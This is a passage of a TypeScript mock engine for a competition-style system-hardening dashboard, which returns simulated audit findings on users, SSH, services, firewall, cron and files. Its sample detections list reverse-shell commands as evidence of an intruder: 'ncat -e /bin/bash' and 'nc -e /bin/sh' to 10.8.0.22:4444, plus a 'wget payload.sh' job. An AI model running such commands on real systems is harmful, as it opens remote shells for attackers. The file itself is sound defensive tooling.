import type { Finding, OpResult, Severity } from '../catalog/types'
import { isSuspicious, liveUsers, type GroupRecord, type UserRecord } from './users'

export type FirewallState = {
  enabled: boolean
  profile: 'default' | 'competition-safe'
  rules: { id: string; action: string; spec: string }[]
}

export type MockContext = {
  demoMode: boolean
  users: UserRecord[]
  groups: GroupRecord[]
  firewall: FirewallState
  notes: string
  favorites: string[]
  journalCount: number
  preflightDone: number
  preflightTotal: number
  applyUsers: (updater: (users: UserRecord[]) => UserRecord[]) => void
  applyFirewall: (fw: FirewallState) => void
}

export const DEFAULT_FIREWALL: FirewallState = {
  enabled: false,
  profile: 'default',
  rules: [
    { id: 'r1', action: 'ALLOW', spec: 'in any any (wide open)' },
    { id: 'r2', action: 'ALLOW', spec: 'smb 445 from any' },
  ],
}

export const COMPETITION_FIREWALL: FirewallState = {
  enabled: true,
  profile: 'competition-safe',
  rules: [
    { id: 'd1', action: 'DENY', spec: 'in default deny' },
    { id: 'd2', action: 'ALLOW', spec: 'tcp/22 ssh from admin-net' },
    { id: 'd3', action: 'ALLOW', spec: 'tcp/80 http scored service' },
    { id: 'd4', action: 'ALLOW', spec: 'tcp/443 https scored service' },
    { id: 'd5', action: 'DENY', spec: 'tcp/23 telnet' },
    { id: 'd6', action: 'DENY', spec: 'tcp/445 smb inbound' },
    { id: 'd7', action: 'DENY', spec: 'udp/137-139 netbios' },
  ],
}

function delayMs(): number {
  return import.meta.env.MODE === 'test' ? 20 : 420 + Math.floor(Math.random() * 320)
}

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms))
}

let findingSeq = 0
function f(severity: Severity, title: string, detail: string, remediation?: string): Finding {
  findingSeq += 1
  return { id: `f_${findingSeq}`, severity, title, detail, remediation }
}

function result(summary: string, findings: Finding[], extra: Partial<OpResult> = {}): OpResult {
  return { summary, findings, ...extra }
}

export async function runMockOp(opId: string, ctx: MockContext): Promise<OpResult> {
  await sleep(delayMs())
  const runner = runners[opId]
  if (!runner) {
    return result(`No mock runner for ${opId}`, [
      f('info', 'Unwired op', 'This id is in the catalog but has no mock engine yet.'),
    ])
  }
  return runner(ctx)
}

const runners: Record<string, (ctx: MockContext) => OpResult> = {
  'users.list': (ctx) => {
    const users = liveUsers(ctx.users)
    const flagged = users.filter((u) => u.flagged).length
    return result(`Enumerated ${users.length} local accounts (${flagged} flagged).`, [
      f('info', 'Local account inventory', `${users.length} accounts in the mock SAM/passwd.`),
      f(
        users.some((u) => u.uid === 0 && u.name !== 'root') ? 'crit' : 'ok',
        'UID 0 aliases',
        users
          .filter((u) => u.uid === 0)
          .map((u) => u.name)
          .join(', '),
      ),
    ], {
      meta: { source: ctx.demoMode ? 'demo mock' : 'engine (unavailable — demo data)' },
      tables: [
        {
          title: 'passwd-style dump',
          columns: [
            { key: 'name', label: 'user', mono: true },
            { key: 'uid', label: 'uid', mono: true },
            { key: 'shell', label: 'shell', mono: true },
            { key: 'home', label: 'home', mono: true },
            { key: 'status', label: 'status' },
          ],
          rows: users.map((u) => ({
            name: u.name,
            uid: String(u.uid),
            shell: u.shell,
            home: u.home,
            status: u.status,
          })),
        },
      ],
    })
  },

  'users.flag-suspicious': (ctx) => {
    const hits = liveUsers(ctx.users).filter(isSuspicious)
    ctx.applyUsers((users) =>
      users.map((u) => (hits.some((h) => h.id === u.id) ? { ...u, flagged: true } : u)),
    )
    return result(`Flagged ${hits.length} suspicious accounts.`, hits.map((u) =>
      f(
        u.uid === 0 && u.name !== 'root' ? 'crit' : 'warn',
        `${u.name}`,
        reason(u),
        u.authorized ? 'Verify before disable' : 'Disable or delete after README check',
      ),
    ), {
      tables: [
        {
          title: 'Heuristic hits',
          columns: [
            { key: 'name', label: 'user', mono: true },
            { key: 'why', label: 'why' },
          ],
          rows: hits.map((u) => ({ name: u.name, why: reason(u) })),
        },
      ],
    })
  },

  'users.disable': (ctx) => {
    const candidates = liveUsers(ctx.users).filter(
      (u) => !u.authorized && u.status === 'active' && u.name !== 'root',
    )
    return result(
      `${candidates.length} unauthorized active accounts ready to disable. Select rows and confirm.`,
      candidates.map((u) =>
        f('warn', u.name, `${u.notes || 'Unauthorized'} — use row action or bulk disable.`),
      ),
    )
  },

  'users.enable': (ctx) => {
    const locked = liveUsers(ctx.users).filter((u) => u.status === 'locked' || u.status === 'disabled')
    return result(`${locked.length} locked/disabled accounts.`, locked.map((u) =>
      f(u.authorized ? 'info' : 'warn', u.name, `${u.status} — ${u.notes}`),
    ))
  },

  'users.delete': (ctx) => {
    const extra = liveUsers(ctx.users).filter((u) => !u.authorized && u.name !== 'root')
    return result(
      `${extra.length} unauthorized accounts are deletion candidates. Delete is confirm-gated.`,
      extra.map((u) => f('warn', u.name, u.notes)),
    )
  },

  'users.groups': (ctx) => {
    const anomalies = ctx.groups.filter((g) => g.anomaly)
    return result(`${ctx.groups.length} groups, ${anomalies.length} membership anomalies.`, anomalies.map((g) =>
      f('warn', g.name, `${g.anomaly} (members: ${g.members.join(', ')})`),
    ), {
      tables: [
        {
          title: 'Groups',
          columns: [
            { key: 'name', label: 'group', mono: true },
            { key: 'gid', label: 'gid', mono: true },
            { key: 'members', label: 'members' },
            { key: 'anomaly', label: 'anomaly' },
          ],
          rows: ctx.groups.map((g) => ({
            name: g.name,
            gid: String(g.gid),
            members: g.members.join(', '),
            anomaly: g.anomaly ?? '',
          })),
        },
      ],
    })
  },

  'users.uid0': (ctx) => {
    const uid0 = liveUsers(ctx.users).filter((u) => u.uid === 0)
    const admins = liveUsers(ctx.users).filter((u) => u.sudo)
    return result(
      `${uid0.length} UID 0 account(s), ${admins.length} sudo/admin-equivalent.`,
      [
        ...uid0.map((u) =>
          f(
            u.name === 'root' ? 'info' : 'crit',
            `${u.name} uid=${u.uid}`,
            u.name === 'root' ? 'Expected root' : 'Root alias — disable immediately',
            u.name === 'root' ? undefined : 'Lock + delete after evidence snapshot',
          ),
        ),
        ...admins
          .filter((u) => !u.authorized)
          .map((u) => f('warn', `${u.name} in sudo`, u.notes)),
      ],
    )
  },

  'users.guest-audit': (ctx) => {
    const names = new Set(['guest', 'games', 'ftp', 'ubuntu', 'testuser', 'defaultaccount'])
    const hits = liveUsers(ctx.users).filter((u) => names.has(u.name.toLowerCase()))
    return result(`Default/guest-style accounts: ${hits.length}.`, hits.map((u) =>
      f(u.name === 'guest' ? 'crit' : 'warn', u.name, `${u.status}, shell ${u.shell}, ${u.notes}`),
    ))
  },

  'users.password-aging': (ctx) => {
    const never = liveUsers(ctx.users).filter((u) => u.neverExpires && interactiveShellName(u.shell))
    return result(`${never.length} interactive accounts with never-expires.`, never.map((u) =>
      f('warn', u.name, 'Password never expires', 'Set MAX_DAYS=90 and require change on next login'),
    ), {
      tables: [
        {
          title: 'Aging',
          columns: [
            { key: 'name', label: 'user', mono: true },
            { key: 'never', label: 'never expires' },
            { key: 'last', label: 'last login' },
          ],
          rows: liveUsers(ctx.users)
            .filter((u) => interactiveShellName(u.shell))
            .map((u) => ({
              name: u.name,
              never: u.neverExpires ? 'YES' : 'no',
              last: u.lastLogin ?? 'never',
            })),
        },
      ],
    })
  },

  'users.empty-password': (ctx) => {
    const empty = liveUsers(ctx.users).filter((u) => u.emptyPassword || u.hashHint === 'empty')
    const weak = liveUsers(ctx.users).filter((u) => u.hashHint === 'descrypt')
    return result(
      `${empty.length} empty passwords, ${weak.length} weak hash indicators (read-only).`,
      [
        ...empty.map((u) =>
          f('crit', `${u.name} empty password`, 'Login with blank secret possible', 'Lock and force reset'),
        ),
        ...weak.map((u) =>
          f('warn', `${u.name} descrypt/LM-style hash`, 'Ancient hash — crackable offline'),
        ),
      ],
    )
  },

  'auth.password-policy': () =>
    result('Password policy has 3 gaps versus a typical CP scoring key.', [
      f('crit', 'Minimum length 5', 'login.defs PASS_MIN_LEN=5 / net accounts min 5', 'Set 12+ with complexity'),
      f('warn', 'No lockout', 'faillock/account lockout threshold is 0', 'Lock after 5 failures for 15m'),
      f('warn', 'Password history 0', 'Remember=0', 'Remember 10+'),
      f('ok', 'Max age 90', 'PASS_MAX_DAYS=90 on Linux mock'),
      f('info', 'Complexity', 'Windows complexity disabled in mock secpol'),
    ], {
      checklist: [
        { id: 'len', label: 'Min length ≥ 12', status: 'fail', note: 'currently 5' },
        { id: 'hist', label: 'History ≥ 10', status: 'fail' },
        { id: 'lock', label: 'Lockout threshold 3–5', status: 'fail' },
        { id: 'age', label: 'Max age 60–90', status: 'pass' },
        { id: 'idle', label: 'Idle session lock', status: 'warn', note: 'screensaver not enforced' },
      ],
    }),

  'auth.failed-logins': () =>
    result('41 failed logins in the last 2h — spray against root and admin.', [
      f('crit', 'Password spray', 'root from 10.8.0.22 — 18 failures', 'Keep root SSH disabled; watch 10.8.0.22'),
      f('warn', 'admin lockouts', 'Windows admin 7× 4625 from console'),
      f('info', 'guest attempts', 'guest denied (good) 4×'),
    ], {
      logs: [
        { ts: '21:04:11', level: 'AUTH', msg: 'sshd: Failed password for root from 10.8.0.22 port 44112' },
        { ts: '21:04:13', level: 'AUTH', msg: 'sshd: Failed password for root from 10.8.0.22 port 44113' },
        { ts: '21:08:02', level: 'AUTH', msg: 'Windows 4625 admin from CONSOLE' },
        { ts: '21:11:44', level: 'WARN', msg: 'sshd: Invalid user l33t from 10.8.0.22' },
        { ts: '21:12:01', level: 'INFO', msg: 'sshd: Accepted publickey for cpadmin from 10.2.0.15' },
      ],
    }),

  'auth.ssh-harden': () =>
    result('sshd_config: 4 high-value misses, 5 already good.', [
      f('crit', 'PermitRootLogin yes', '/etc/ssh/sshd_config:32', 'Set prohibit-password or no'),
      f('crit', 'PasswordAuthentication yes', 'Password auth still on', 'Prefer keys; disable passwords if README allows'),
      f('warn', 'X11Forwarding yes', 'Unnecessary attack surface'),
      f('warn', 'MaxAuthTries 10', 'Lower to 3–4'),
      f('ok', 'Protocol 2', 'Implicit in modern OpenSSH'),
      f('ok', 'PermitEmptyPasswords no', 'Good'),
    ], {
      checklist: [
        { id: 'root', label: 'PermitRootLogin no/prohibit-password', status: 'fail' },
        { id: 'pwd', label: 'PasswordAuthentication no (if keys OK)', status: 'fail' },
        { id: 'empty', label: 'PermitEmptyPasswords no', status: 'pass' },
        { id: 'x11', label: 'X11Forwarding no', status: 'fail' },
        { id: 'proto', label: 'No Protocol 1', status: 'pass' },
        { id: 'banner', label: 'Banner set', status: 'warn' },
      ],
    }),

  'auth.sudoers': () =>
    result('sudoers/Administrators: NOPASSWD and unexpected members.', [
      f('crit', 'NOPASSWD: ALL', 'ubuntu ALL=(ALL) NOPASSWD: ALL', 'Remove leftover cloud sudo'),
      f('warn', 'john in sudo', 'Authorized user — confirm README before stripping'),
      f('warn', 'admin in sudo', 'Unauthorized admin-named account'),
      f('ok', 'cpadmin in sudo', 'Expected team admin'),
    ], {
      tables: [
        {
          title: 'sudoers fragments',
          columns: [
            { key: 'file', label: 'file', mono: true },
            { key: 'line', label: 'line', mono: true },
          ],
          rows: [
            { file: '/etc/sudoers', line: 'root ALL=(ALL:ALL) ALL' },
            { file: '/etc/sudoers.d/90-cloud-init', line: 'ubuntu ALL=(ALL) NOPASSWD: ALL' },
            { file: '/etc/sudoers.d/cp', line: 'cpadmin ALL=(ALL) ALL' },
          ],
        },
      ],
    }),

  'auth.sessions': (ctx) => {
    const now = liveUsers(ctx.users).filter((u) => u.loggedIn)
    return result(`${now.length} interactive sessions right now.`, now.map((u) =>
      f('info', u.name, `${u.shell} — last login ${u.lastLogin ?? 'active'}`),
    ), {
      tables: [
        {
          title: 'who',
          columns: [
            { key: 'name', label: 'user', mono: true },
            { key: 'tty', label: 'tty', mono: true },
            { key: 'from', label: 'from', mono: true },
          ],
          rows: now.map((u, i) => ({
            name: u.name,
            tty: i === 0 ? ':0' : `pts/${i}`,
            from: u.name === 'cpadmin' ? '10.2.0.15' : 'console',
          })),
        },
      ],
    })
  },

  'svc.running': () =>
    result('7 units deviate from the competition-safe baseline.', [
      f('crit', 'telnet.socket enabled', 'Should be masked'),
      f('crit', 'rpcbind running', 'NFS leftover'),
      f('warn', 'cups running', 'Printer service rarely scored'),
      f('warn', 'avahi-daemon running', 'mDNS'),
      f('ok', 'sshd running', 'Expected if remote admin allowed'),
      f('ok', 'cron running', 'Expected'),
    ], {
      tables: [
        {
          title: 'Diff vs baseline',
          columns: [
            { key: 'unit', label: 'unit', mono: true },
            { key: 'state', label: 'state' },
            { key: 'want', label: 'baseline' },
          ],
          rows: [
            { unit: 'ssh.service', state: 'active', want: 'active' },
            { unit: 'telnet.socket', state: 'enabled', want: 'masked' },
            { unit: 'rpcbind.service', state: 'active', want: 'inactive' },
            { unit: 'cups.service', state: 'active', want: 'inactive' },
            { unit: 'apache2.service', state: 'active', want: 'active (scored)' },
          ],
        },
      ],
    }),

  'svc.insecure': () =>
    result('Insecure service checklist: 3 still enabled.', [
      f('crit', 'telnet', 'socket enabled on :23'),
      f('crit', 'rsh/rlogin', 'rsh-server installed'),
      f('warn', 'vsftpd', 'installed, inactive'),
      f('ok', 'ypbind', 'not installed'),
      f('ok', 'nfs-server', 'inactive'),
    ], {
      checklist: [
        { id: 'telnet', label: 'telnet masked/removed', status: 'fail' },
        { id: 'rsh', label: 'rsh/rlogin removed', status: 'fail' },
        { id: 'ftp', label: 'ftp disabled unless scored', status: 'warn' },
        { id: 'nfs', label: 'nfs-server off', status: 'pass' },
        { id: 'smb', label: 'smbd off unless scored', status: 'warn' },
      ],
    }),

  'svc.processes': () =>
    result('Process inventory found 2 odd parent/child pairs.', [
      f('crit', 'ncat under apache2', 'pid 4481 ppid 1022 httpd — reverse shell pattern'),
      f('warn', 'python3 -c under cron', 'pid 5102 — review crontab'),
      f('ok', 'sshd → sshd: cpadmin', 'Normal session'),
    ], {
      tables: [
        {
          title: 'Odd processes',
          columns: [
            { key: 'pid', label: 'pid', mono: true },
            { key: 'ppid', label: 'ppid', mono: true },
            { key: 'cmd', label: 'cmd', mono: true },
          ],
          rows: [
            { pid: '4481', ppid: '1022', cmd: 'ncat -e /bin/bash 10.8.0.22 4444' },
            { pid: '5102', ppid: '1', cmd: 'python3 -c "import socket..."' },
            { pid: '2210', ppid: '1', cmd: '/usr/sbin/sshd -D' },
          ],
        },
      ],
    }),

  'svc.startup': () =>
    result('Startup/enablement: 2 unexpected units plus a Run key.', [
      f('crit', 'systemd: nc-persist.service enabled', '/etc/systemd/system/nc-persist.service'),
      f('warn', 'Windows Run: Steam', 'HKCU\\...\\Run\\Steam'),
      f('ok', 'sshd enabled', 'WantedBy multi-user.target'),
    ], {
      tables: [
        {
          title: 'Enabled units / Run keys',
          columns: [
            { key: 'name', label: 'name', mono: true },
            { key: 'where', label: 'where' },
          ],
          rows: [
            { name: 'ssh.service', where: 'systemd enabled' },
            { name: 'nc-persist.service', where: 'systemd enabled (unexpected)' },
            { name: 'Steam', where: 'HKCU Run' },
          ],
        },
      ],
    }),

  'svc.cron': () =>
    result('Cron/at/Task Scheduler: 3 jobs look hostile or leftover.', [
      f('crit', 'root cron reverse shell', '* * * * * nc -e /bin/sh 10.8.0.22 4444'),
      f('warn', 'ubuntu at job', 'at 03:00 — wget payload.sh'),
      f('warn', 'Windows task GameUpdate', 'Runs as SYSTEM every hour'),
      f('ok', 'logrotate daily', 'Expected'),
    ], {
      tables: [
        {
          title: 'Jobs',
          columns: [
            { key: 'src', label: 'source' },
            { key: 'sched', label: 'schedule', mono: true },
            { key: 'cmd', label: 'command', mono: true },
          ],
          rows: [
            { src: '/var/spool/cron/root', sched: '* * * * *', cmd: 'nc -e /bin/sh 10.8.0.22 4444' },
            { src: 'at.allow ubuntu', sched: '03:00', cmd: 'wget payload.sh' },
            { src: 'Task Scheduler', sched: 'hourly', cmd: 'C:\\Games\\update.exe' },
            { src: '/etc/cron.daily/logrotate', sched: 'daily', cmd: 'logrotate' },
          ],
        },
      ],
    }),

  'net.ports': () =>
    result('11 listeners; 3 are not on the expected scored-service list.', [
      f('crit', ':23 telnet', 'in.telnetd'),
      f('crit', ':4444 ncat', 'ncat (not a scored service)'),
      f('warn', ':445 smbd', 'SMB exposed'),
      f('ok', ':22 sshd', 'Expected'),
      f('ok', ':80 apache2', 'Scored web'),
    ], {
      tables: [
        {
          title: 'ss -lntup',
          columns: [
            { key: 'proto', label: 'proto' },
            { key: 'local', label: 'local', mono: true },
            { key: 'proc', label: 'process', mono: true },
          ],
          rows: [
            { proto: 'tcp', local: '0.0.0.0:22', proc: 'sshd' },
            { proto: 'tcp', local: '0.0.0.0:80', proc: 'apache2' },
            { proto: 'tcp', local: '0.0.0.0:23', proc: 'in.telnetd' },
            { proto: 'tcp', local: '127.0.0.1:3306', proc: 'mysqld' },
            { proto: 'tcp', local: '0.0.0.0:445', proc: 'smbd' },
            { proto: 'tcp', local: '0.0.0.0:4444', proc: 'ncat' },
          ],
        },
      ],
    }),

  'net.firewall-status': (ctx) =>
    result(
      `Firewall ${ctx.firewall.enabled ? 'ON' : 'OFF'} — profile ${ctx.firewall.profile}.`,
      [
        ctx.firewall.enabled
          ? f('ok', 'Firewall enabled', ctx.firewall.profile)
          : f('crit', 'Firewall disabled', 'ufw inactive / Windows Firewall off'),
        f('info', `${ctx.firewall.rules.length} rules`, ctx.firewall.rules.map((r) => r.spec).join('; ')),
      ],
      {
        tables: [
          {
            title: 'Rules',
            columns: [
              { key: 'action', label: 'action' },
              { key: 'spec', label: 'spec', mono: true },
            ],
            rows: ctx.firewall.rules.map((r) => ({ action: r.action, spec: r.spec })),
          },
        ],
        meta: { profile: ctx.firewall.profile, enabled: String(ctx.firewall.enabled) },
      },
    ),

  'net.firewall-apply': (ctx) => {
    ctx.applyFirewall(COMPETITION_FIREWALL)
    return result('Applied competition-safe profile (demo mock rules).', [
      f('ok', 'Default deny in', 'Inbound default deny'),
      f('ok', 'Allow scored web', '80/443'),
      f('ok', 'Allow SSH from admin-net', '22 restricted'),
      f('ok', 'Block telnet/smb/netbios', '23, 445, 137-139'),
    ], {
      tables: [
        {
          title: 'Applied rules',
          columns: [
            { key: 'action', label: 'action' },
            { key: 'spec', label: 'spec', mono: true },
          ],
          rows: COMPETITION_FIREWALL.rules.map((r) => ({ action: r.action, spec: r.spec })),
        },
      ],
    })
  },

  'net.shares': () =>
    result('Shares: 2 world-reachable, 1 NFS export without squash.', [
      f('crit', 'SMB Public$', 'Guest access, Everyone:F'),
      f('warn', 'NFS /home *(rw,no_root_squash)', 'Home exported unsquashed'),
      f('ok', 'print$ disabled', 'Not shared'),
    ], {
      tables: [
        {
          title: 'Shares / exports',
          columns: [
            { key: 'name', label: 'name', mono: true },
            { key: 'path', label: 'path', mono: true },
            { key: 'acl', label: 'acl' },
          ],
          rows: [
            { name: 'Public$', path: '/srv/public', acl: 'Guest, Everyone:F' },
            { name: 'NFS /home', path: '/home', acl: '*(rw,no_root_squash)' },
            { name: 'IPC$', path: 'IPC', acl: 'default' },
          ],
        },
      ],
    }),

  'net.hosts': () =>
    result('Hosts file has 2 anomalous redirects.', [
      f('crit', 'scoreboard sinkhole', '10.0.0.1 cyberpatriot.org  (local hijack)'),
      f('warn', 'extra mapping', '13.13.13.13 update.microsoft.com'),
      f('ok', 'localhost present', '127.0.0.1 localhost'),
    ], {
      tables: [
        {
          title: '/etc/hosts',
          columns: [
            { key: 'ip', label: 'ip', mono: true },
            { key: 'name', label: 'name', mono: true },
          ],
          rows: [
            { ip: '127.0.0.1', name: 'localhost' },
            { ip: '::1', name: 'localhost' },
            { ip: '10.0.0.1', name: 'cyberpatriot.org' },
            { ip: '13.13.13.13', name: 'update.microsoft.com' },
          ],
        },
      ],
    }),

  'fs.world-writable': () =>
    result('World-writable hunt: 5 hits outside sticky temp.', [
      f('crit', '/opt/web/uploads 777', 'Web root writable by others'),
      f('crit', '/etc/passwd.bak 666', 'Backup of passwd is world-writable'),
      f('warn', '/home/ubuntu 777', 'Home is world-writable'),
      f('ok', '/tmp sticky 1777', 'Expected'),
    ], {
      tables: [
        {
          title: 'find hits',
          columns: [
            { key: 'mode', label: 'mode', mono: true },
            { key: 'path', label: 'path', mono: true },
          ],
          rows: [
            { mode: '0777', path: '/opt/web/uploads' },
            { mode: '0666', path: '/etc/passwd.bak' },
            { mode: '0777', path: '/home/ubuntu' },
            { mode: '0666', path: '/var/www/html/config.php' },
            { mode: '1777', path: '/tmp (sticky — ok)' },
          ],
        },
      ],
    }),

  'fs.suid': () =>
    result('SUID/SGID: 2 binaries not on the known-good list.', [
      f('crit', '/usr/local/bin/backup', 'SUID root, not a distro binary'),
      f('warn', '/usr/bin/find (SUID)', 'find should not be setuid'),
      f('ok', '/usr/bin/passwd', 'Expected'),
      f('ok', '/usr/bin/sudo', 'Expected'),
    ], {
      tables: [
        {
          title: 'SUID/SGID',
          columns: [
            { key: 'bits', label: 'bits', mono: true },
            { key: 'path', label: 'path', mono: true },
            { key: 'note', label: 'note' },
          ],
          rows: [
            { bits: '4755', path: '/usr/bin/passwd', note: 'known-good' },
            { bits: '4755', path: '/usr/bin/sudo', note: 'known-good' },
            { bits: '4755', path: '/usr/local/bin/backup', note: 'UNEXPECTED' },
            { bits: '4755', path: '/usr/bin/find', note: 'UNEXPECTED' },
          ],
        },
      ],
    }),

  'fs.sticky': () =>
    result('Sticky bit missing on /var/tmp.', [
      f('ok', '/tmp 1777', 'Sticky set'),
      f('crit', '/var/tmp 0777', 'No sticky bit — anyone can delete others\' files'),
      f('ok', '/dev/shm 1777', 'Sticky set'),
    ]),

  'fs.home-perms': () =>
    result('Home permission audit: 3 homes too open.', [
      f('warn', '/home/alice 755', 'World-readable — tighten to 750'),
      f('crit', '/home/ubuntu 777', 'World-writable'),
      f('warn', '/home/admin 775', 'Group-writable'),
      f('ok', '/home/cpadmin 750', 'Good'),
    ]),

  'fs.prohibited-media': () =>
    result('Forbidden media/games: 6 files under user homes and /opt.', [
      f('warn', 'mp3 in alice', '/home/alice/Music/track.mp3'),
      f('warn', 'mp4 in student1', '/home/student1/Videos/movie.mp4'),
      f('crit', 'Steam leftover', 'C:\\Program Files (x86)\\Steam\\steam.exe'),
      f('crit', 'Minecraft jar', '/home/ubuntu/minecraft.jar'),
    ], {
      tables: [
        {
          title: 'Hits (extensions: mp3,mp4,avi,exe-games,jar)',
          columns: [
            { key: 'path', label: 'path', mono: true },
            { key: 'size', label: 'size' },
          ],
          rows: [
            { path: '/home/alice/Music/track.mp3', size: '8.2M' },
            { path: '/home/student1/Videos/movie.mp4', size: '420M' },
            { path: '/opt/games/doom.sh', size: '12K' },
            { path: '/home/ubuntu/minecraft.jar', size: '22M' },
            { path: 'C:\\Users\\Public\\score.wav', size: '1.1M' },
            { path: 'C:\\Program Files (x86)\\Steam\\steam.exe', size: '3.4M' },
          ],
        },
      ],
      meta: { extensions: 'mp3,mp4,avi,wav,jar,steam,minecraft' },
    }),

  'fs.web-hidden': () =>
    result('Web root hidden/backup files: 4 hits.', [
      f('crit', '.git exposed', '/var/www/html/.git/HEAD'),
      f('crit', 'phpinfo.php', '/var/www/html/phpinfo.php'),
      f('warn', 'config.php.bak', '/var/www/html/config.php.bak'),
      f('warn', '.env', '/var/www/html/.env'),
    ]),

  'fs.integrity': () =>
    result('Critical file hash snapshot captured (demo).', [
      f('info', 'Snapshot time', new Date().toISOString()),
      f('warn', '/etc/shadow changed vs gold', 'Compare after you finish user ops'),
    ], {
      tables: [
        {
          title: 'sha256',
          columns: [
            { key: 'path', label: 'path', mono: true },
            { key: 'hash', label: 'sha256', mono: true },
          ],
          rows: [
            { path: '/etc/passwd', hash: 'a91c…e22b' },
            { path: '/etc/shadow', hash: 'c10f…99aa' },
            { path: '/etc/ssh/sshd_config', hash: '77b1…0de4' },
            { path: '/etc/sudoers', hash: '5e02…bb18' },
            { path: '/etc/hosts', hash: 'd3c8…41f0' },
            { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', hash: 'd3c8…41f0' },
          ],
        },
      ],
    }),

  'log.service': () =>
    result('Logging stack is partially up.', [
      f('ok', 'systemd-journald', 'active'),
      f('warn', 'rsyslog', 'inactive — /var/log/auth.log may stall'),
      f('ok', 'Windows Event Log', 'running (demo)'),
      f('warn', 'auditd', 'not installed'),
    ], {
      checklist: [
        { id: 'journald', label: 'journald running', status: 'pass' },
        { id: 'rsyslog', label: 'rsyslog/syslog-ng running', status: 'fail' },
        { id: 'eventlog', label: 'Event Log running', status: 'pass' },
        { id: 'auditd', label: 'auditd present', status: 'warn' },
      ],
    }),

  'log.sudo': () =>
    result('Recent admin events: 6 sudo/su and 2 Windows 4672.', [
      f('warn', 'ubuntu sudo NOPASSWD', 'ubuntu : COMMAND=/bin/bash (21:02)'),
      f('info', 'cpadmin useradd', 'cpadmin : COMMAND=/usr/sbin/useradd testuser'),
      f('warn', 'su to root from guest', 'FAILED su for root by guest'),
    ], {
      logs: [
        { ts: '21:02:11', level: 'AUTH', msg: 'sudo: ubuntu : TTY=pts/2 ; COMMAND=/bin/bash' },
        { ts: '21:06:40', level: 'AUTH', msg: 'sudo: cpadmin : COMMAND=/usr/sbin/useradd testuser' },
        { ts: '21:09:02', level: 'ERROR', msg: 'su: FAILED su for root by guest' },
        { ts: '21:10:18', level: 'INFO', msg: 'Windows 4672 Special privileges assigned to cpadmin' },
      ],
    }),

  'log.auth-spike': () =>
    result('Spike detector: 1 burst above threshold (10 fails / 2 min).', [
      f('crit', 'Burst on root@sshd', '18 failures in 96s from 10.8.0.22'),
      f('warn', 'Windows admin 4625 cluster', '7 failures from CONSOLE'),
      f('ok', 'alice', 'No failures'),
    ], {
      meta: { window: '2 min', threshold: '10' },
    }),

  'log.notepad': (ctx) =>
    result('Notes snapshot stored in the session journal.', [
      f('info', 'Notepad size', `${ctx.notes.length} characters`),
      f('info', 'Tip', 'This pane is a live editor — Run snapshots to the journal.'),
    ]),

  'sw.inventory': () =>
    result('Package inventory: 428 packages; highlighting notable ones.', [
      f('info', 'Web stack', 'apache2 2.4.58, php8.3, mariadb'),
      f('warn', 'telnetd installed', 'Should not be present'),
      f('warn', 'nmap installed', 'Prohibited unless README says otherwise'),
    ], {
      tables: [
        {
          title: 'Notable packages',
          columns: [
            { key: 'name', label: 'name', mono: true },
            { key: 'ver', label: 'version', mono: true },
            { key: 'note', label: 'note' },
          ],
          rows: [
            { name: 'apache2', ver: '2.4.58', note: 'scored?' },
            { name: 'openssh-server', ver: '9.6p1', note: 'admin' },
            { name: 'telnetd', ver: '0.17', note: 'REMOVE' },
            { name: 'nmap', ver: '7.94', note: 'prohibited?' },
            { name: 'steam', ver: '1.0.0.78', note: 'prohibited' },
          ],
        },
      ],
    }),

  'sw.prohibited': () =>
    result('Prohibited software: 5 hits.', [
      f('crit', 'nmap', 'Installed via apt'),
      f('crit', 'wireshark', 'Installed'),
      f('crit', 'Steam', 'Windows + leftover .desktop'),
      f('warn', 'john the ripper', '/usr/bin/john'),
      f('warn', 'hydra', 'not found (ok)'),
    ]),

  'sw.updates': () =>
    result('Updates (read-only): 14 pending, 2 critical.', [
      f('crit', 'openssl', 'pending security (USN-mock)'),
      f('crit', 'Windows KB5034441', 'pending (demo)'),
      f('warn', '12 other packages', 'apt list --upgradable'),
      f('ok', 'Last apt update', '3 days ago — refresh indexes'),
    ], {
      tables: [
        {
          title: 'Pending (mock)',
          columns: [
            { key: 'pkg', label: 'package', mono: true },
            { key: 'from', label: 'from' },
            { key: 'to', label: 'to' },
          ],
          rows: [
            { pkg: 'openssl', from: '3.0.10', to: '3.0.13' },
            { pkg: 'login', from: '1:4.13', to: '1:4.13.1' },
            { pkg: 'KB5034441', from: '-', to: 'security' },
          ],
        },
      ],
    }),

  'sw.remote-access': () =>
    result('Browser / RAT audit: 3 unexpected remote-admin tools.', [
      f('crit', 'TeamViewer', 'service running'),
      f('crit', 'AnyDesk', 'installed, not running'),
      f('warn', 'TightVNC', 'listening :5900'),
      f('ok', 'RDP', 'Expected on Windows images if scored; confirm README'),
      f('info', 'Browsers', 'Firefox ESR (ok), Chrome Canary (unexpected)'),
    ]),

  'win.registry': () =>
    result('Registry harden checklist: 4 keys off recommended values.', [
      f('crit', 'Autoplay enabled', 'NoDriveTypeAutoRun != 0xFF'),
      f('crit', 'LLMNR enabled', 'EnableMulticast=1'),
      f('warn', 'SMBv1 enabled', 'SMB1=1'),
      f('warn', 'Guest SID present', 'EnableGuest=1'),
      f('ok', 'RequireSecuritySignature', 'SMB signing on'),
    ], {
      checklist: [
        { id: 'autoplay', label: 'Disable Autoplay', status: 'fail' },
        { id: 'llmnr', label: 'Disable LLMNR', status: 'fail' },
        { id: 'smb1', label: 'Disable SMBv1', status: 'fail' },
        { id: 'guest', label: 'Disable Guest', status: 'fail' },
        { id: 'sign', label: 'SMB signing required', status: 'pass' },
      ],
    }),

  'win.secpol': () =>
    result('Local Security Policy snapshot (mock secedit).', [
      f('warn', 'Audit account logon', 'No auditing'),
      f('warn', 'SeDenyNetworkLogonRight', 'Guest not denied'),
      f('ok', 'Password complexity', 'Enabled in this snapshot'),
      f('crit', 'LimitBlankPasswordUse', '0 — blank network passwords allowed'),
    ], {
      tables: [
        {
          title: 'Selected policy',
          columns: [
            { key: 'key', label: 'policy' },
            { key: 'val', label: 'value', mono: true },
          ],
          rows: [
            { key: 'MinimumPasswordLength', val: '5' },
            { key: 'LockoutBadCount', val: '0' },
            { key: 'AuditAccountLogon', val: '0' },
            { key: 'LimitBlankPasswordUse', val: '0' },
            { key: 'EnableGuestAccount', val: '1' },
          ],
        },
      ],
    }),

  'win.iis': () =>
    result('IIS / Windows features: default site + extra CGI.', [
      f('warn', 'IIS installed', 'Confirm it is a scored service before removing'),
      f('crit', 'Directory browsing on', 'Default Web Site'),
      f('warn', 'CGI enabled', 'Rarely needed'),
      f('ok', 'FTP Server feature', 'Not installed'),
    ], {
      tables: [
